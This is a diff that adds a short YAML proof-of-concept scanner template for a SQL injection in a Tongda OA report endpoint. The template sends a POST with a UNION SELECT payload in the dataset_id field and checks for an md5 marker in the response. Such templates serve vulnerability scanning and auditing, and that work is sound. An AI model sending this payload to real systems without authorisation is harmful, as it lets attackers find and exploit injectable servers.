@@ -1,0 +1,15 @@
+name: poc-yaml-通达OA-report_bi-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /general/bi_design/appcenter/report_bi.func.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      _POST[dataset_id]=efgh'-@`'`)union select 1,2,md5(123)#'&action=get_link_info&
+    expression:
+      status: 200
+      body_all: ["202cb962ac59075b964b07152d234b70"]
